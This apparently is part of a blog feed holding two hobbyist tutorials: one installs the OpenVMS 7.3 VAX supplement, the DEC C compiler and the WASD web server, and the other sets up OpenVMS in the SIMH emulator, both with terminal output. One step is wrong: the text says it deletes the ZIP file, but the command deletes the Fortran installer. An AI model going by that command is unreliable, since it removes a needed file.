<p>A supplemental disc is available for OpenVMS 7.3, this contains developer tools which can be essential if you want a fully-functional learning system. This will give us an opportunity to make use of our recently-installed &#8216;wget&#8217; utility. While still in [.DOWNLOADS], create a new directory called SUPP, change to this dir then use &#8216;wget&#8217; to retrieve your ZIP:</p>

<pre><code>$ create&#47;dir SUPP
$ set def [.SUPP]

$ wget "https:&#47;&#47;mirrors.pdp-11.ru&#47;_vax__&#47;_VMS&#47;_distrib&#47;7.X&#47;Openvms%20Vax%2073%20Supplement.zip"
--22:24:46--  https:&#47;&#47;mirrors.pdp-11.ru&#47;_vax__&#47;_VMS&#47;_distrib&#47;7.X&#47;Openvms%20Vax%2073%20Supplement.zip
           =&#62; `Openvms Vax 73 Supplement.zip&#39;
Resolving ... xxx.xxx.xxx.xxx
Connecting to ...|xxx.xxx.xxx.xxx|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 54,545,839 (52M) [application&#47;zip]
100%[====================================&#62;] 54,545,839   231.87K&#47;s    ETA 00:00

22:28:10 (261.50 KB&#47;s) - `Openvms Vax 73 Supplement.zip&#39; saved [54545839&#47;54545839]
</code></pre>

<p>Unzip the file, and have a look at the contents. Unzipping will probably take some time.</p>

<pre><code>$ unzip OpenVMS-VAX-7_3-Supplement.zip
Archive:  DUA1:[INT16H.SUPP]OPENVMS-VAX-7_3-SUPPLEMENT.ZIP;1
  inflating: aacrt060.a              
~

$ dir

Directory DUA1:[INT16H.SUPP]

AACRT060.A;1        BASIC039.A;1        BASIC039.B;1        BASIC039.C;1       
BASIC039.D;1        BASIC039.E;1        CC064.A;1           CC064.B;1          
DCPSVAX021.A;1      DCPSVAX021.B;1      DCPSVAX021.C;1      DEC-VAXVMS-FORTRAN-V0606-201-1.PCSI;1
DECSET124.A;1       DECSET124.B;1       DECSET124.C;1       DECSET124.D;1      
DECSET124.E;1       DECSET124.F;1       DECSET124.G;1       DECSET124.H;1      
DECSET124.I;1       DECSET124.J;1       DECSET124.K;1       DTC010.A;1         
DTC010.B;1          DTRA072.A;1         DTRA072.B;1         DTRA072.C;1        
FORT066.A;1         OPENVMS-VAX-7_3-SUPPLEMENT.ZIP;1        PASCAL058.A;1      
PASCAL058.B;1       PASCAL058.C;1       PASCAL058.D;1       VMSI18N073.A;1     
VMSI18N073.B;1      VMSI18N073.C;1      

Total of 37 files.
</code></pre>

<p>Ok, so you&#8217;ve waited for this archive to decompress - and now you are presented with 37 files. You will notice that most of the files end in a one-letter extension, the two exceptions being the .ZIP and .PCSI files. Lets delete the ZIP file to save space.</p>

<pre><code>$ delete DEC-VAXVMS-FORTRAN-V0606-201-1.PCSI;1
</code></pre>

<p>You should get used to using full filenames, including the revision appendage(;#) when working with files in OpenVMS. Back to our supplements! When you registered for your hobbyist PAKs, I hope you chose every one which was available as you will need licenses&#47;PAKs for C, PASCAL, FORTRAN and anything else you&#8217;d like to install. Check your e-mail and look for the PAK which begins with: &#8216;<strong>$ LICENSE REGISTER C -</strong>&#8217;. Paste it into your terminal, and load it:</p>

<pre><code>$ $ LICENSE REGISTER C &#47;ISSUER=OPENVMS_HOBBYIST &#47;AUTHORIZATION=DECUS-XXX-#########-#######
 &#47;PRODUCER=DEC &#47;UNITS=0 &#47;TERMINATION_DATE=##-XXX-#### &#47;ACTIVITY=CONSTANT=100
 &#47;CHECKSUM=#-XXXX-XXXX-XXXX-XXXX

$ license load C
%LICENSE-I-UNLOADED, DEC C has been unloaded
%LICENSE-I-LOADED, DEC C was successfully loaded with 0 units
</code></pre>

<p>We now have a license installed and loaded for C. Now we may install it safely, without complaints. When installing &#8216;system&#8217; software, it is often preferred it is done as the &#8216;<strong>SYSTEM</strong>&#8217; user. Issue &#8216;<strong>lo</strong>&#8217; to logout of the system, then re-login as SYSTEM:</p>

<pre><code>$ lo
Connection closed by foreign host.N-2009 00:44:44.56
cgxlap:~ int16h$ 
cgxlap:~ int16h$ telnet 10.0.0.69
Trying 10.0.0.69...
Connected to 10.0.0.69.
Escape character is &#39;^]&#39;.


 Welcome to OpenVMS (TM) VAX Operating System, Version V7.3    

Username: SYSTEM
Password: 
 Welcome to OpenVMS (TM) VAX Operating System, Version V7.3
    Last interactive login on Friday, 26-DEC-2008 19:26

Now we will change into the directory where our supplements are stored, and install Compaq C.

$ set def DUA1:[INT16H.SUPP]
$ @SYS$UPDATE:VMSINSTAL CC064 DUA1:[INT16H.SUPP]
        OpenVMS VAX Software Product Installation Procedure V7.3

It is 14-JAN-2009 at 00:52.

Enter a question mark (?) at any time for help.

* Are you satisfied with the backup of your system disk [YES]? 

The following products will be processed:

  CC V6.4
        Beginning installation of CC V6.4 at 00:52

%VMSINSTAL-I-RESTORE, Restoring product save set A ...

**WARNING!** If you downloaded these sets and you are not using an original CD&#47;ISO, it&#39;s likely they do not have the correct attributes set for VMSINSTAL to acknowledge them. You may receive messages like:

%BACKUP-F-NOTSAVESET, DUA1:[INT16H.SUPP]CC064.A;1 is not a BACKUP save set
%VMSINSTAL-E-NOSAVESET, Save set  A  cannot be restored.

This may sound quite serious, but usually - as mentioned above, it&#39;s due to incorrect file attributes. This can be fixed quite easily:

$ SET FILE&#47;ATT=(LRL:32256,MRS:32256,RFM:FIX) CC064.*;*
$ @SYS$UPDATE:VMSINSTAL CC064 DUA1:[INT16H.SUPP]

Installation should now continue, most of the answers to questions will be quite easy to answer; If in doubt - answer &#39;YES&#39; to any questions regarding installing something.

        Product:      C
        Producer:     DEC
        Version:      6.4
        Release Date: 05-JAN-2001

* Does this product have an authorization key registered and loaded? YES

As we have already installed and loaded our PAK, you should answer &#39;YES&#39; here.

    The file SYS$STARTUP:CCXX$STARTUP.COM contains commands to be
    executed at system startup to allow for the best compilation
    performance.  You may want to invoke this command file from your
    system&#39;s site specific start up file.  This command file does not
    have to be invoked for correct operation of Compaq C.
</code></pre>

<p>Again, these kind of installation notes can be very useful. In this case it&#8217;s not crucial to perform this task for the product to function, but sometimes there will be additional steps you must take.  </p>

<h2 id="installing-wasd-vms-hypertext-services">Installing WASD VMS Hypertext Services</h2>

<p><a href="http://wasd.vsm.com.au/">WASD</a> is <strong>the</strong> HTTP server package exclusive to OpenVMS. We&#8217;re going to compile and install it now so you can test out the compiler you just installed. There are architecture-specific packages we could use to install WASD, but I&#8217;m sure you&#8217;re eager to let it compile while you go make some coffee. We&#8217;ll start by downloading <strong>htroot930.zip</strong> from <a href="http://wasd.vsm.com.au/wasd/">wasd.vsm.com.au&#47;wasd&#47;</a>; make sure you are in your <strong>DOWNLOADS</strong>directory. After the transfer has completed, logout and then login as the SYSTEM user.</p>

<pre><code>$ wget http:&#47;&#47;wasd.vsm.com.au&#47;wasd&#47;htroot930.zip
$ lo
</code></pre>

<p>Because we have not covered the <strong>LOGIN.COM</strong> file yet, added our dcl$path to it and have not installed our utilities in [BIN] to a system-wide directory&#8230; we will have to manually set dcl$path. After this, we will change to the root of <strong>dua1</strong> using <strong>DUA1:[000000]</strong> as the path, and will finally unzip WASD there, and begin the installation.</p>

<pre><code>$ SET DEF dua1:[000000]
$ UNZIP dua1:[INT16H.DOWNLOADS]HTROOT930.ZIP
</code></pre>

<p>Extraction will take some time, it will result in the directory <strong>dua1:[HT_ROOT]</strong> being created. As per the WASD <a href="http://wasd.vsm.com.au/wasd/htroot930.txt">ReadMe</a> file - we may now proceed to install WASD.</p>

<pre><code>$ @DUA1:[HT_ROOT]INSTALL

%DCL-S-SPAWNED, process SYSTEM_1 spawned
%DCL-S-ATTACHED, terminal now attached to process SYSTEM_1

      WASD VMS Hypertext Services, Copyright (C) 1996-2008 Mark G.Daniel.
  This package (all associated programs), comes with ABSOLUTELY NO WARRANTY.
   This is free software, and you are welcome to redistribute it under the
 conditions of the GNU GENERAL PUBLIC LICENSE, version 3, or any later version.
                    http:&#47;&#47;www.gnu.org&#47;licenses&#47;gpl.txt

               ************************************************
               *  INSTALL WASD VMS HYPERTEXT SERVICES v9.3.0  *
               ************************************************

All sections may be individually declined before making any modifications.
In this sense the install may be undertaken step-by-step or sections repeated.
The first section is COMPILING&#47;LINKING, after which you will be able to quit.
In a mixed architecture cluster (including both Alpha and VAX systems) the
compile&#47;link section must be performed on both!

Press RETURN to continue: 

                             *******************
                             *  BUILD PACKAGE  *
                             *******************

Package executables must be built.

  0. skip this step
  1. compiling from source, then linking
  2. linking (separate package) object modules

Select build method [0]: 1

                   **************************************
                   *  NO SSL TOOLKIT COULD BE LOCATED!  *
                   **************************************

None of the following SSL toolkits could be located.

  o  OpenSSL toolkit
  o  VMS SSL product (HP)
  o  WASD OpenSSL package
  o  Jean-Fran?ois Pi?ronne (OpenSSL toolkit)

A non-SSL version of the server will be built.

Press RETURN to continue: 

                         **************************
                         *  BUILDING EXECUTABLES  *
                         **************************

%DCL-I-IGNQUAL, qualifiers appearing before this item were ignored
 \VERSION\
Compaq C V6.4-005 on OpenVMS VAX V7.3    

--- HTTPD ---

P1=BUILD
Building for "VAX" architecture
Without SSL
$ IF JUST .NES. "" THEN GOTO 
$!
$ DELETE [.OBJ_VAX]*.*;*
%DELETE-W-SEARCHFAIL, error searching for HT_ROOT:[SRC.HTTPD.OBJ_VAX]*.*;*
-RMS-E-FNF, file not found
$!
$ ADMIN:   CC &#47;DECC &#47;STAND=RELAXED_ANSI &#47;PREFIX=ALL &#47;OPTIMIZE &#47;NODEBUG &#47;NOWARNING 
    &#47;FLOAT=D_FLOAT &#47;DEFINE=(WASD_VMS_V6,WATCH_CAT=1,WATCH_MOD=0,WASD_ACME=0) 
    &#47;OBJ=[.OBJ_VAX]Admin    Admin.c
</code></pre>

<p>You <em>could</em> install one of the listed SSL toolkits, but we don&#8217;t really need SSL encryption for our little test (emulated) box at the moment. As previously mentioned, this will take some time - so find something constructive to do while you wait. I suggest looking for VAX or Alpha hardware on an auction site ;-).  </p>

<p>Eventually the build will finish. We have some more steps to do though:</p>

<pre><code>                            ********************
                            *  BUILD FINISHED  *
                            ********************

                          ************************
                          *  SERVER QUICK-CHECK  *
                          ************************

This executes the package demonstration procedure, allowing the basic package
to be evaluated or checked.  You may run this at any time to again check the
package for basic functionality using @HT_ROOT:[INSTALL]DEMO.COM

Execute the demonstration procedure? [NO]: NO

                        ****************************
                        *  CONTINUE INSTALLATION?  *
                        ****************************

Continue the installation? [NO]: YES

%SECHAN-I-RDBADDMSG, identifier WASD_HTTP_SERVER value 80010001 added to rights database
%SECHAN-I-RDBADDMSG, identifier WASD_HTTP_NOBODY value 80010002 added to rights database
%SECHAN-I-RDBADDMSG, identifier WASD_IGNORE_THIS value 80010003 added to rights database

                     **********************************
                     *  CREATE&#47;MODIFY SERVER ACCOUNT  *
                     **********************************

The &#39;server&#39; account HTTP$SERVER is the one the HTTPd process executes as.
It is considered a security advantage to script using a different account.

It must have a unique UIC, preferably in a group of it&#39;s own.
DO NOT choose the SYSTEM group ([1,*]) or other privileged group, or [3nn,*]
which is reserved to OpenVMS!

Note: [077,1] is a suggested UIC.
You will be shown whether the entered uic exists before continuing.
Entering "NONE" OR "0" skips account creation&#47;modification.

[077,1]: 077,1

%UAF-W-BADSPC, no user matches specification

If no user matched the specification then the UIC is available!
Choices: YES, create the account using this UIC.  NO, select another.

[NO]: YES
</code></pre>

<p>The server account &#8220;HTTP$SERVER&#8221; must have a unique home directory.</p>

<p>The default is a reasonable location for most sites.</p>

<p>If another device is preferred or already in place, out of the package tree,
then that can be specified and used.  The directory name should remain as
[HTTP$SERVER] however.  Package security settings are applied to this.</p>

<p>You will be shown whether the home area already exists before continuing.
Entering &#8220;NONE&#8221; OR &#8220;0&#8221; exits this dialog.</p>

<pre><code>[HT_ROOT:]: HT_ROOT

The area HT_ROOT:[HTTP$SERVER] currently exists.
Continue to use this?

[NO]: YES

HTTP$SERVER account created, setting ...
%UAF-I-MDFYMSG, user record(s) updated
%UAF-I-MDFYMSG, user record(s) updated
%UAF-I-MDFYMSG, user record(s) updated
%UAF-I-MDFYMSG, user record(s) updated
%UAF-I-GRANTMSG, identifier WASD_HTTP_SERVER granted to HTTP$SERVER

Username: HTTP$SERVER                      Owner:  WASD Server
Account:                                   UIC:    [77,1] ([HTTP$SERVER])
CLI:      DCL                              Tables: DCLTABLES
Default:  HT_ROOT:[HTTP$SERVER]
LGICMD:   LOGIN.COM
Flags:  DisNewMail DisMail
Primary days:   Mon Tue Wed Thu Fri        
Secondary days:                     Sat Sun
Primary   000000000011111111112222  Secondary 000000000011111111112222
Day Hours 012345678901234567890123  Day Hours 012345678901234567890123
Network:  ##### Full access ######            ##### Full access ######
Batch:    ##### Full access ######            ##### Full access ######
Local:    -----  No access  ------            -----  No access  ------
Dialup:   -----  No access  ------            -----  No access  ------
Remote:   -----  No access  ------            -----  No access  ------
Expiration:            (none)    Pwdminimum:  6   Login Fails:     0
Pwdlifetime:         90 00:00    Pwdchange:      (pre-expired) 
Last Login:            (none) (interactive),            (none) (non-interactive)
Maxjobs:         0  Fillm:       300  Bytlm:      5000000
Maxacctjobs:     0  Shrfillm:      0  Pbytlm:           0
Maxdetach:       0  BIOlm:      2000  JTquota:       4000
Prclm:         100  DIOlm:      1000  WSdef:         1000
Prio:            4  ASTlm:      2000  WSquo:         4000
Queprio:         0  TQElm:       100  WSextent:     20000
CPU:        (none)  Enqlm:       500  Pgflquo:     500000
Authorized Privileges: 
  NETMBX    TMPMBX
Default Privileges: 
  NETMBX    TMPMBX
Identifier                         Value           Attributes
  WASD_HTTP_SERVER                 %X80010001      

Press RETURN to continue: 
</code></pre>

<p>What is displayed at the end may be a lot to take in. It&#8217;s what user-accounts look like from UAF. There are a lot of different fields here which will be discussed at a later time, for now all you need to know that a user has been created for the server: <strong>HTTP$SERVER</strong> with a UIC of <strong>[77,1]</strong>. Hit RETURN to continue, and you will be presented with another prompt for creating an additional user - <strong>HTTP$NOBODY</strong>, which is used for the execution of DCL &#38; DECnet scripts. The defaults will be fine for us.</p>

<p>~</p>

<pre><code>Note: [076,1] is a suggested UIC.
You will be shown whether the entered uic exists before continuing.
Entering "NONE" OR "0" skips account creation&#47;modification.

[076,1]: 
[NO]: YES
[HT_ROOT:]:         

The area HT_ROOT:[HTTP$NOBODY] currently exists.
Continue to use this?

[NO]: YES
Press RETURN to continue: 

          ********************************************************
          *  GRANT WASD_HTTP_NOBODY TO OTHER SCRIPTING ACCOUNTS  *
          ********************************************************
If you have other accounts that script using files contained in the general
scripting areas ([CGI-BIN], [AXP-BIN], [IA64-BIN] or [VAX-BIN]) you almost
certainly will need to grant the WASD_HTTP_NOBODY rights identifer to allow
those accounts access to the files in the scripting directories.

If you use a scripting account (HTTP$NOBODY) separate to the server account
(HTTP$SERVER) you should never, and should never need to, grant the
WASD_HTTP_NOBODY identifier to the server account.  The idea is to isolate the
two environments as much as possible.

Account name? []: *ENTER*

                        *****************************
                        *  (RE)SECURE THE PACKAGE?  *
                        *****************************

Begin to make changes to files and security settings in the package.

Secure the package? [NO]: YES

                   **************************************
                   *  SETTING PACKAGE FILE PROTECTIONS  *
                   **************************************

Please be patient, this may take some (considerable) time ...

PROGRESS: 100...200...300...

We can proceed with with the installation, just install everything - I&#39;m sure you&#39;ll want to play with all the different scripts at some point.

                           *****************************
                            *  SERVER WRITE TO [LOCAL]  *
                            *****************************

    To allow updating of configuration files located in HT_ROOT:[LOCAL] via the
    Server Administration interface, the [LOCAL] directory must have a specific
    access control entry added.  Note that write access cannot occur unless
    HTTPD$AUTH path access is also configured.

    Allow server write access to [LOCAL]? [NO]: YES
~
                          *************************
                          *  HTTPD SUPPORT FILES  *
                          *************************

Copies files from HT_ROOT:[EXAMPLE]

  STARTUP.COM           to    HT_ROOT:[STARTUP]
  SHUTDOWN.COM          to    HT_ROOT:[STARTUP]
  STARTUP_DECNET.COM    to    HT_ROOT:[STARTUP]
  STARTUP_LOCAL.COM     to    HT_ROOT:[STARTUP]
  STARTUP_SERVER.COM    to    HT_ROOT:[STARTUP]

  HTTPD$AUTH.CONF       to    HT_ROOT:[LOCAL]
  HTTPD$CONFIG.CONF     to    HT_ROOT:[LOCAL]
  HTTPD$MAP.CONF        to    HT_ROOT:[LOCAL]
  HTTPD$MSG.CONF        to    HT_ROOT:[LOCAL]

Copy the files? [NO]: YES

                            *****************************
                            *  INSTALL PACKAGE SCRIPTS  *
                            *****************************

    The procedure HT_ROOT:[INSTALL]SCRIPTS.COM installs package scripts.
    It prompts for selected groups of scripts to be installed or removed.  More
    information is available when using the procedure.  Scripts available with this
    release of the package will not be available for use by the server until this
    procedure is performed.

    You can execute the procedure now or do it later manually.

    Execute the procedure now? [NO]: YES

                            ****************************
                            *  SERVER UTILITY SCRIPTS  *
                            ****************************

    PCACHE.EXE ......... proxy cache reporting and maintainance script
    PROXYMUNGE.EXE ..... reverse-proxy URL rewriting for HTML and CSS
    QDLOGSTATS.EXE ..... Quick and Dirty LOG STATisticS

    Install these scripts? [NO]: YES

                             ************************
                              *  USEFUL VMS SCRIPTS  *
                              ************************

    Conan The Librarian ..... Help and Text Library access
    HyperReader ............. Online Documentation, Bookreader and BNU access
    HyperSPI ................ System Performance Information
    hyperDISK ............... graphical disk usage report
    SHOW ...................  provides system information (must be enabled)

    Install these scripts? [NO]: YES

                           *****************************
                            *  DOCUMENT&#47;FILE SEARCHING  *
                            *****************************

    QUERY and EXTRACT are scripts that can be used to perform ad hoc searching of
    HTML and plain-text documents and files, returning all or partial documents.
    The scope of where they can search should be carefully controlled but they can
    be very useful.  Check script source descriptive prologue for more detail.

    Install these scripts? [NO]: YES

                       ***************************************
                       *  CGIPLUS&#47;RTE DEMONSTRATION SCRIPTS  *
                       ***************************************

    The CGIplus demonstration scripts are examples of how to create persistent
    scripting using DCL and the C language.  See the "Scripting Overview" document
    for further information on CGIplus.

    Includes the CGIsapi (ISAPI) environment and demonstration DLL.

    Includes the RTE (Run Time Environment) example interpreter.

    Install these scripts? [NO]: YES

                           *******************************
                           *  DCL DEMONSTRATION SCRIPTS  *
                           *******************************

    The DCL demonstration scripts are examples of CGI scripting using DCL.

    CGI_SYMBOLS.COM ....... displays the CGI variables available to a script
    CGIUTL.EXE ............ utility for assisting with DCL scripts
    COOKIE_DEMO.COM ....... an example of cookie manipulation using DCL.
    FORMWORK.EXE .......... HTML form data validation and CSV processor
    IPCTICKLER.EXE ........ script programmer  education tool
    TMAILER.EXE ........... email using a template

    Some include using the CGIUTL utility within the DCL environment.

    Install these scripts? [NO]: YES

                             ***************************
                             *  MISCELLANEOUS SCRIPTS  *
                             ***************************

    Calendar ........ simple calendar maker
    Charset ......... displays the browser character set
    Colors .......... displays fonts with different fore&#47;background colors
    Fetch ........... can get pages and other resources from HTTP servers
    gList ........... list and display graphics in a directory

    Install these scripts? [NO]: YES

                      **************************************
                       *  OSU&#47;DECNET DEMONSTRATION SCRIPTS  *
                       **************************************

    These are some OSU demonstration scripts (from the OSU package).
    There are also WASD-specific CGI DECnet script examples.

    Install these scripts? [NO]: YES

                          ********************************
                          *  JAVA DEMONSTRATION CLASSES  *
                          ********************************

    The JAVA.COM java script wrapper procedure and example Java classes.

    Install these scripts? [NO]: YES
</code></pre>

<p>Well done! You now have a working HTTP server installed on your system. You can start it up now by running its startup file.</p>

<pre><code>$ set def DUA1:[HT_ROOT.STARTUP]
$ @startup.com
%WASD-I-STARTUP, begin
%WASD-I-STARTUP, using non-SSL image
%HTTPD-S-PROC_ID, identification of created process is 00000218
%WASD-I-STARTUP, end
</code></pre>

<p>Everything appears to be in order, let&#8217;s have a look at the running processes:</p>

<pre><code>$ show system&#47;full
OpenVMS V7.3  on node CGXVAX  14-JAN-2009 20:28:15.61  Uptime  1 21:25:15
        VAXserver 3900 Series
  Pid    Process Name    State  Pri      I&#47;O       CPU       Page flts  Pages
00000201 SWAPPER         HIB     16        0   0 00:00:00.15         0      0   
         [SYSTEM]                                                           0Kb
00000205 CONFIGURE       HIB      8        5   0 00:00:00.06       112    175   
         [SYSTEM]                                                          87Kb
00000206 LANACP          HIB     12       41   0 00:00:00.11       354    712   
         [SYSTEM]                                                         356Kb
00000208 IPCACP          HIB     10        6   0 00:00:00.10        99    177   
         [SYSTEM]                                                          88Kb
00000209 ERRFMT          HIB      8     1475   0 00:00:00.41       146    227   
         [1,6]                                                            113Kb
0000020B OPCOM           HIB      8      264   0 00:00:00.31       328    180   
         [SYSTEM]                                                          90Kb
0000020C AUDIT_SERVER    HIB     10       96   0 00:00:01.00       528    919   
         [SYSTEM]                                                         459Kb
0000020D JOB_CONTROL     HIB     10       48   0 00:00:00.17       192    343   
         [SYSTEM]                                                         171Kb
0000020E SECURITY_SERVER HIB     10       32   0 00:00:03.05      1869   1509   
         [SYSTEM]                                                         754Kb
0000020F TP_SERVER       HIB      9    10886   0 00:00:44.46       205    317   
         [SYSTEM]                                                         158Kb
00000210 TCPIP$INETACP   HIB     10      155   0 00:00:00.53       757    855   
         [SYSTEM]                                                         427Kb
00000214 INT16H          LEF      9      120   0 00:00:00.37       714    512   
         [INT16H]                                                         256Kb
00000216 SYSTEM          CUR      5    20474   0 00:02:13.67      7147    336   
         [SYSTEM]                                                         168Kb
00000218 HTTPd:80        HIB      6      840   0 00:00:05.02      3764   3091   
         [HTTP$SERVER]                                                   1545Kb
</code></pre>

<p>Excellent. Not only is WASD HTTPd running, it&#8217;s running as the user it should be - <strong>HTTP$SERVER</strong>. Try opening a browser and accessing your new server. Many of the demo scripts+functions won&#8217;t work for security reasons - you will be able to enable what you like later on when you configure and customize your server. For now, you can run &#8216;<strong>DEMO.COM</strong>&#8217; from &#8216;<strong>DUA1:[HT_ROOT.INSTALL]</strong>&#8217; which will start a demonstration server up on port 7080 in &#8220;promiscuous&#8221; mode. This should allow you to test the examples included with WASD. Be warned though, some scripts will cause the demo instance to die due the &#8216;SYSTEM&#8217; account&#8217;s <strong>AST quota</strong>. Quotas and the UAF will be explained later.</p>

]]></description>
</item>

<item>
<guid>/articles/openvms_simh_1.html</guid>
<link>/articles/openvms_simh_1.html</link>
<pubDate>Sat, 10 Jan 2009 00:00:00 +0000</pubDate>
<title>OpenVMS and SIMH - Part 1</title>
<description><![CDATA[

<h1 id="openvms-and-simh---part-1">OpenVMS and SIMH - Part 1</h1>

<p>Running OpenVMS on the SIMH VAX simulator</p>

<p><a href="http://en.wikipedia.org/wiki/OpenVMS">OpenVMS</a>  is an operating system originally developed by  <a href="http://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC</a>  (Digital Equipment Corporation), a company acquired by  <a href="http://en.wikipedia.org/wiki/Compaq">Compaq</a>  which was then acquired by  <a href="http://en.wikipedia.org/wiki/Hewlett-Packard">HP</a>  for the  <a href="http://en.wikipedia.org/wiki/VAX">VAX</a>  platform.  </p>

<p>Although development started in the mid-1970s into the 1980s, OpenVMS is still very much alive with up-to version 7.3 available for VAX, and continued development in 8.x for  <a href="http://en.wikipedia.org/wiki/DEC_Alpha">DEC Alpha</a>  and now Intel  <a href="http://en.wikipedia.org/wiki/Itanium">Itanium</a>  architectures. Even Oracle, who acquired DEC&#8217;s  <a href="http://en.wikipedia.org/wiki/Oracle_Rdb">Rdb</a>  RDBMS have  <a href="http://www.oracle.com/technology/products/rdb/htdocs/rdb7/rdb_statement_of_direction.html">stated</a>  that they will continue to support and develop Rdb, creating a lesser gap between it and Oracle Database systems.  </p>

<p><a href="http://en.wikipedia.org/wiki/SIMH">SIMH</a>  is a set of emulators for various systems and is developed by Bob Supnik, who is a former engineer for DEC. One of the systems it is able to emulate is the VAX. This is what we&#8217;re interested in. An excellent feature of SIMH (among many) is that it supports networking (albeit experimental support; I&#8217;ve had no problems so far).  </p>

<p>If you are unable to install OpenVMS, consider looking at  <del><a href="http://deathrow.vistech.net/">http:&#47;&#47;deathrow.vistech.net</a>  (Beave&#8217;s former OpenVMS cluster)</del> <a href="http://www.polarhome.com/">PolarHome</a> where you can get a taste of OpenVMS without installation.  </p>

<p>So, we&#8217;re going to install OpenVMS within SIMH&#8217;s VAX emulator. There are a few prerequisites, some of which may be difficult to meet:</p>

<ul>
<li>  <a href="http://simh.trailing-edge.com/">SIMH w&#47; Networking</a>  (  <a href="http://simh.trailing-edge.com/sources/simhv38-0-exe-ether.zip">win32</a>  &#47;  <a href="http://macappstore.org/simh/">macOS</a>)</li>
<li>  <a href="http://www.winpcap.org/">WinPcap</a>  (for win32 SIMH networking)</li>
<li>  A  <a href="http://en.wikipedia.org/wiki/DECUS">HP User Society (Formerly DECUS)</a>  membership (hint:  <a href="https://www.connect-community.de/Membership/application">Connect Deutschland</a>  has no fee for basic membership. Site is in German)</li>
<li> <a href="https://www.hpe.com/h41268/live/index_e.aspx?qid=24548">HPE OpenVMS Hobbyist Registration</a>  (For your license PAKs)</li>
<li>  <a href="http://mirrors.pdp-11.ru/_vax__/_VMS/_distrib/7.X/">OpenVMS 7.3 VAX Media</a></li>
</ul>

<p>DECUS membership is required to be able to register licenses for your hobbyist system. Some chapters may issue your membership number straight away online, others will send you a membership card in the post.</p>

<p>When HPE exit the OpenVMS game and VSI fully take over, there is no guarantee that the hobbyist program will be continued, though I heard from Hari at HPE that they are interested in fostering the program for their own VMS version.</p>

<p><strong>!!! Mac OS X Note !!!</strong>  </p>

<p>The binaries linked to in the prerequisites may fail on your system.<br/>
On Mac OS X 10.5.5 (Intel) they caused problems for me, so you should  install Apple Xcode and compile from source. Follow <a href="https://web.archive.org/web/20090312034321/http://64.223.189.234/node/922">this guide</a> if using GCC 4.x.  </p>

<p><strong>!!!</strong>  </p>

<p><strong>Getting Ready</strong>  </p>

<p>I&#8217;ll assume that you have already received the OpenVMS VAX and additional license paks via E-mail. The licenses aren&#8217;t required to install OpenVMS - but without them you will have a very limited installation.  </p>

<p>Start off by creating a directory somewhere, be this <em>~&#47;OpenVMS</em>, <em>C:\OpenVMS</em>, <em>&#47;Users&#47;int16h&#47;OpenVMS</em> or wherever you please. Copy the VAX emulator from SIMH to this directory, as well as <strong>ka655.bin</strong>. If you have an ISO image of the installation media, copy those there too (I will be using an ISO for this tutorial).  </p>

<p><strong>Configuring SIMH::VAX</strong>  </p>

<p>SIMH needs to know how much RAM and other virtual hardware you will be attaching. Although you could do this from the SIMH prompt, it&#8217;s not very practical so we will create a config file named <strong>openvms.ini</strong>. Below is a commented config which will suit our needs, but you will need to customize it for your own use.</p>

<pre><code>; Load CPU microcode
load -r ka655.bin
;
; Set memory allocation to 64M
set cpu 64m
;
; We will have 2 DEC RA92 disk drives, about 1.5G capacity.
set rq0 ra92
set rq1 ra92
;
; rq3 will be a CD-ROM drive
set rq3 cdrom
;
; Attach the devices to files, these will be our virtual disks
attach rq0 d0.dsk
attach rq1 d1.dsk
;
; Attach the CD-ROM drive to our installation media ISO (use &#39;dd&#39; ;)
attach -r rq3 OpenVMS73.iso
;
; We don&#39;t need rl and ts devices, so we can disable them.
;
set rl disable
set ts disable
;
; Attach Ethernet to a network interface. This will work in &#39;bridged&#39;
; mode. Make sure to define a fake MAC address if using Windows.
; Unlike Linux, *BSD etc Windows does not have a nice, logical alias
; for network interfaces.
;
; Windows Example:
;set xq mac=08-00-2B-AA-BB-CC
;attach xq \Device\NPF_{9622ACD6-7383-4C42-B8F3-FBFA22573B71}
;
; Linux&#47;*BSD&#47;UNIX Example:
;attach xq eth0
;
; Mac OS X:
;attach xq en0
;
; Uncomment the following if you&#39;d prefer to telnet into SIMH
; from another machine rather than use the local console, 6969=port.
;
;set telnet 6969
;
;
; Boot the system:
;
boot cpu
</code></pre>

<p>Save this file, and make sure you&#8217;re in the directory you created in a terminal.  </p>

<p><strong>Installing OpenVMS</strong>  </p>

<pre><code>Run: **.&#47;vax openvms.ini**

sh-3.2# .&#47;vax openvms.ini 
VAX simulator V3.8-0
RQ: unit is read only
Eth: opened en0

KA655-B V5.3, VMB 2.7
Performing normal system tests.
40..39..38..37..36..35..34..33..32..31..30..29..28..27..26..25..
24..23..22..21..20..19..18..17..16..15..14..13..12..11..10..09..
08..07..06..05..04..03..
Tests completed.

&#62;&#62;&#62;
</code></pre>

<p>Good. The system has booted and is now awaiting further instructions. Those of you familiar with Sun SPARC hardware may recognise an initial firmware prompt like this. From here, we will boot our virtual CD-ROM with <strong>boot dua3</strong>.</p>

<pre><code>&#62;&#62;&#62;boot dua3
(BOOT&#47;R5:0 DUA3
  2..
-DUA3
  1..0..

%SYSBOOT-I-SYSBOOT Mapping the SYSDUMP.DMP on the System Disk
%SYSBOOT-W-SYSBOOT Can not map SYSDUMP.DMP on the System Disk
%SYSBOOT-W-SYSBOOT Can not map PAGEFILE.SYS on the System Disk
   OpenVMS (TM) VAX Version X7G7 Major version id = 1 Minor version id = 0
%WBM-I-WBMINFO Write Bitmap has successfully completed initialization.
PLEASE ENTER DATE AND TIME (DD-MMM-YYYY  HH:MM)  09-JAN-2009 20:11

OpenVMS installation will now probe your system for available devices. Once it has finished enumerating your devices, it will prompt you to enter "**YES**".

Configuring devices . . .
Now configuring HSC, RF, and MSCP-served devices . . .

Please check the names of the devices which have been configured,
to make sure that ALL remote devices which you intend to use have
been configured.

If any device does not show up, please take action now to make it
available.

Available device  DUA0:                            device type RA92
Available device  DUA1:                            device type RA92
Available device  DUA2:                            device type RD54
Available device  DUA3:                            device type RRD40
Available device  DYA0:                            device type RX02
Available device  DYA1:                            device type RX02
Available device  MUA0:                            device type TK50
Available device  MUA1:                            device type TK50
Available device  MUA2:                            device type TK50
Available device  MUA3:                            device type TK50

Enter "YES" when all needed devices are available:  YES
%BACKUP-I-IDENT, Stand-alone BACKUP T7.2; the date is  9-JAN-2009 20:15:24.42
</code></pre>

